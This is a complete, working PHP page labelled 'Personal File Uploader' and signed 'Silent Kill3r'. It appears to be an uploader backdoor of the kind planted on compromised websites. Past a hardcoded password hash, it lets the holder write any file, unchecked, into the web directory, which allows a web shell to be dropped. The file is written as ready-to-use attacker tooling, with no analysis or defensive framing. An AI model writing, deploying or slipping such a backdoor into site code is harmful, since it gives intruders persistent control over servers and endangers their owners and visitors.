<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
   <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
   <title>Personal File Uploader</title>
   <meta name="generator" content="Silent Kill3r" />
   <meta name="author" content="Silent Kill3r" />
   <meta name="description" content="[ Silent Kill3r ]" />
   <style>
      body {
          background: #000000 url(https://i.imgur.com/E5gN1eK.gif) scroll repeat center center;
          color: silver;
          font-family: Comic Sans MS;
          font-size: 14px;
          font-weight: bold;
      }
      .container {
          margin: 0 auto;
          width: 300px;
          padding: 20px;
          background: #333;
          border: 1px solid #444;
      }
      .msg {
          color: green;
      }
      .emsg {
          color: red;
      }
   </style>
</head>
<body>
<?php
session_start();

define('HASHED_PASSWORD', '$2y$10$QF541pYpQim.tUq2lx482OhUCeeGZVRq3jbveKZ75Q626M0/2gULS'); // Replace this with the hashed password

function showLoginForm() {
?>
   <div class="container">
       <form action="" method="post">
           <label>Password:
               <input type="password" name="password" />
           </label>
           <input type="submit" value="Login" />
       </form>
   </div>
<?php
    exit();
}

// Check if the user is authenticated
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    if (isset($_POST['password']) && password_verify($_POST['password'], HASHED_PASSWORD)) {
        $_SESSION['authenticated'] = true;
        header("Location: " . $_SERVER['PHP_SELF']); // Redirect to the same page
        exit();
    } else {
        showLoginForm();
    }
}

class maxUpload {
    var $uploadLocation;

    function __construct() {
        $this->uploadLocation = getcwd() . DIRECTORY_SEPARATOR;
    }

    function setUploadLocation($dir) {
        $this->uploadLocation = $dir;
    }

    function showUploadForm($msg = '', $error = '') {
?>
        <div class="container">
            <center><b>Silent Kill3r.. ;)</b></center><br/>
            <?php
            if ($msg != '') {
                echo '<p class="msg">' . $msg . '</p>';
            } else if ($error != '') {
                echo '<p class="emsg">' . $error . '</p>';
            }
            ?>
            <form action="" method="post" enctype="multipart/form-data">
                <center>
                    <label><b>File: </b>
                        <input name="myfile" type="file" size="30" />
                    </label>
                    <label>
                        <input type="submit" name="submitBtn" class="sbtn" value="Upload" />
                    </label>
                </center>
            </form>
        </div>
<?php
    }

    function uploadFile() {
        if (!isset($_POST['submitBtn'])) {
            $this->showUploadForm();
        } else {
            $msg = '';
            $error = '';

            // Check destination directory
            if (!file_exists($this->uploadLocation)) {
                $error = "The target directory doesn't exist!";
            } else if (!is_writable($this->uploadLocation)) {
                $error = "The target directory is not writable!";
            } else {
                $target_path = $this->uploadLocation . basename($_FILES['myfile']['name']);

                if (@move_uploaded_file($_FILES['myfile']['tmp_name'], $target_path)) {
                    $msg = basename($_FILES['myfile']['name']) . " was uploaded successfully!";
                } else {
                    $error = "The upload process failed!";
                }
            }

            $this->showUploadForm($msg, $error);
        }
    }
}

$myUpload = new maxUpload();
$myUpload->uploadFile();
?>
</body>
</html>
